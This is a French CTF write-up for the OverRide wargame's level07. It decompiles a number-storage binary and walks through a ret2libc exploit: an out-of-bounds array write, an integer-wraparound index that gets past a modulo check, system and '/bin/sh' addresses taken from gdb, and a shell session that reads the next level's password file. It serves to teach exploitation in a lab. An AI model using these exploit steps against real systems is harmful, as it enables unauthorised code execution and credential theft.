```
level07 : GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8
```


![](Pasted%20image%2020240809022305.png)



```c
undefined4 main(undefined4 param_1,char **param_2,char **param_3)

{
  char cVar1;
  int i;
  uint uVar2;
  undefined4 *puVar3;
  char *pcVar4;
  byte *pbVar5;
  int in_GS_OFFSET;
  bool bVar6;
  bool bVar7;
  bool bVar8;
  byte bVar9;
  char **envp;
  char **argv;
  undefined4 index [100];
  undefined4 local_2c;
  undefined4 input_cmd;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  int Canary;
  
  bVar9 = 0;
  argv = param_2;
  envp = param_3;
  Canary = *(int *)(in_GS_OFFSET + 0x14);
  local_2c = 0;
  input_cmd = 0;
  local_24 = 0;
  local_20 = 0;
  local_1c = 0;
  local_18 = 0;
  puVar3 = index;
  for (i = 100; i != 0; i = i + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  for (; *argv != (char *)0x0; argv = argv + 1) {
    uVar2 = 0xffffffff;
    pcVar4 = *argv;
    do {
      if (uVar2 == 0) break;
      uVar2 = uVar2 - 1;
      cVar1 = *pcVar4;
      pcVar4 = pcVar4 + (uint)bVar9 * -2 + 1;
    } while (cVar1 != '\0');
    memset(*argv,0,~uVar2 - 1);
  }
  for (; *envp != (char *)0x0; envp = envp + 1) {
    uVar2 = 0xffffffff;
    pcVar4 = *envp;
    do {
      if (uVar2 == 0) break;
      uVar2 = uVar2 - 1;
      cVar1 = *pcVar4;
      pcVar4 = pcVar4 + (uint)bVar9 * -2 + 1;
    } while (cVar1 != '\0');
    memset(*envp,0,~uVar2 - 1);
  }
  puts(
      "----------------------------------------------------\n  Welcome to wil\'s crappy number stora ge service!   \n----------------------------------------------------\n Commands:                                          \n    store - store a number into the data storage    \n    read  - read a number from the data storage     \n    quit  - exit the program                        \n----------------------------------------------------\n   wil has reserved some storage :>                 \n----------------------------------------------------\n"
      );
  do {
    printf("Input command: ");
    local_2c = 1;
    fgets((char *)&input_cmd,20,stdin);
    uVar2 = 0xffffffff;
    puVar3 = &input_cmd;
    do {
      if (uVar2 == 0) break;
      uVar2 = uVar2 - 1;
      cVar1 = *(char *)puVar3;
      puVar3 = (undefined4 *)((int)puVar3 + (uint)bVar9 * -2 + 1);
    } while (cVar1 != '\0');
    uVar2 = ~uVar2;
    bVar6 = uVar2 == 1;
    bVar8 = uVar2 == 2;
    *(undefined *)((int)&local_2c + uVar2 + 2) = 0;
    i = 5;
    puVar3 = &input_cmd;
    pbVar5 = (byte *)"store";
    do {
      if (i == 0) break;
      i = i + -1;
      bVar6 = *(byte *)puVar3 < *pbVar5;
      bVar8 = *(byte *)puVar3 == *pbVar5;
      puVar3 = (undefined4 *)((int)puVar3 + (uint)bVar9 * -2 + 1);
      pbVar5 = pbVar5 + (uint)bVar9 * -2 + 1;
    } while (bVar8);
    bVar7 = false;
    bVar6 = (!bVar6 && !bVar8) == bVar6;
    if (bVar6) {
      local_2c = store_number((int)index);
    }
    else {
      i = 4;
      puVar3 = &input_cmd;
      pbVar5 = &DAT_08048d61;
      do {
        if (i == 0) break;
        i = i + -1;
        bVar7 = *(byte *)puVar3 < *pbVar5;
        bVar6 = *(byte *)puVar3 == *pbVar5;
        puVar3 = (undefined4 *)((int)puVar3 + (uint)bVar9 * -2 + 1);
        pbVar5 = pbVar5 + (uint)bVar9 * -2 + 1;
      } while (bVar6);
      bVar8 = false;
      bVar6 = (!bVar7 && !bVar6) == bVar7;
      if (bVar6) {
        local_2c = read_number((int)index);
      }
      else {
        i = 4;
        puVar3 = &input_cmd;
        pbVar5 = &DAT_08048d66;
        do {
          if (i == 0) break;
          i = i + -1;
          bVar8 = *(byte *)puVar3 < *pbVar5;
          bVar6 = *(byte *)puVar3 == *pbVar5;
          puVar3 = (undefined4 *)((int)puVar3 + (uint)bVar9 * -2 + 1);
          pbVar5 = pbVar5 + (uint)bVar9 * -2 + 1;
        } while (bVar6);
        if ((!bVar8 && !bVar6) == bVar8) {
          if (Canary == *(int *)(in_GS_OFFSET + 0x14)) {
            return 0;
          }
                    /* WARNING: Subroutine does not return */
          __stack_chk_fail();
        }
      }
    }
    if (local_2c == 0) {
      printf(" Completed %s command successfully\n",(char *)&input_cmd);
    }
    else {
      printf(" Failed to do %s command\n",(char *)&input_cmd);
    }
    input_cmd = 0;
    local_24 = 0;
    local_20 = 0;
    local_1c = 0;
    local_18 = 0;
  } while( true );
}
```

```c
undefined4 store_number(int param_1)

{
  uint uVar1;
  uint uVar2;
  undefined4 ret;
  
  printf(" Number: ");
  uVar1 = get_unum();
  printf(" Index: ");
  uVar2 = get_unum();
  if ((uVar2 % 3 == 0) || (uVar1 >> 24 == 183)) {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    ret = 1;
  }
  else {
    *(uint *)(uVar2 * 4 + param_1) = uVar1;
    ret = 0;
  }
  return ret;
}
```


```c
undefined4 read_number(int param_1)

{
  uint param1;
  
  printf(" Index: ");
  param1 = get_unum();
  printf(" Number at data[%u] is %u\n",param1,*(uint *)(param1 * 4 + param_1));
  return 0;
}

```

Apres analyse on peut très vite voir que nous somme complètement nu sur les arguments et l'environnement car le programme nous supprime tout.
En gros le programme nous fourni un tableau (index et nombre).
Nous avons trois possibilité sur les commandes
	- store
	- read
	- quit

Store nous demande un nombre ainsi qu'un index, mais l index a quelques conditions:
	- Ne doit pas être un modulo 3
	- Ne doit pas avoir une une valeur ou >> 24 == 183

Il y a deux possibilités pour faire le Level07:
	- Créer son propre shellcode et l'injecter en effectuant plein de store et en modifier l'EIP pour sauter dessus au moment du return;
	- Modifier simplement l'EIP et pour faire un appel a "system" et a l'emplacement suivant mettre la valeur de "/bin/sh" qui nous est fourni dans la libc étant donner qu'elle est chargée.

Nous allons donc prendre la seconde solution.

Pour ce faire, nous avons besoin de récupérer l'adresse de l'EIP qui est en stack, system et la string "/bin/sh" de la libc.

Commençons par récupérer l'adresse de l'EIP dans la stack:

```
gdb ./level07
b main
r
```


![](Pasted%20image%2020240809051532.png)

![](Pasted%20image%2020240809051615.png)

Après avoir fait un "dissas" on peux voir qu il y a 4 push qui on été effectues donc si on affiche l'ESP il faut descendre de 4 adresses pour arriver sur l'EIP.
```
Emplacement de eip dans la stack: 0xffffd6fc
```

Maintenant on doit récupérer l'adresse du tableau de 100 en posant un break apres l'instruction de chargement d'adresse du tableau dans EAX:

![](Pasted%20image%2020240809052454.png)

```
b *main+452
c
```

![](Pasted%20image%2020240809052627.png)

```
eax : 0xffffd534 -> adresse de tableau[0]
```

Maintenant on soustrait les deux adresses afin d'avoir l offeset qui nous permettera de changer l'EIP.

```
0xffffd534 => 4294956340
0xffffd6fc => 4294956796

4294956796 - 4294956340 = 456
```

Nous avons 456 octects pour arriver a l'EIP, sachant que le cast du deplacement est un uint, nous savons que nous effectuons des saut de 4 en 4 dans la memoire.
```
456 / 4 = 114
```

Maintenant il faut "system" et "/bin/sh"

![](Pasted%20image%2020240809054022.png)

On peux voir que la libc est précharger dans l espace mémoire 0xf7e2c000 -> 0xf7fcc000
Maintenant on recherche l adresse de la string "/bin/sh" via find:

```
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) 
```

```
(gdb) info functions system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
(gdb) 
```

Voila nous avons donc toutes les adresses nécessaire pour le RET2LIBC.

il nous faut convertir les adresse en uint:

```
system  => 0xf7e6aed0 => 4159090384
/bin/sh => 0xf7f897ec => 4160264172
```

Nous savons maintenant qu il faut remplacer l'EIP ainsi que l'adresse suivant pour y insérer l'appel de "system" et la string "/bin/sh".

Sachant que 114 est un %3 nous allons pas pouvoir l ecrire en lui donnant directement l index voulu, pour cela nous pouvons lui donner un uint max / 4 + 114 + 1, cela va produire une rotation complete pour arriver un octect avant le tableau puis faire un avancement de l offset + 1 pour tomber sur l'EIP. Le total ne sera donc pas un %3.

```
number: 4159090384
index: 0xffffffff / 4 + 114 + 1 = 1073741938
System est maintenant dans l'eip

number: 4160264172
index: 116
/bin/sh est maintenant a eip+2

```

![](Pasted%20image%2020240809055717.png)

```
(remote) level07@OverRide:/home/users/level07$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$
```

```
level08 : 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```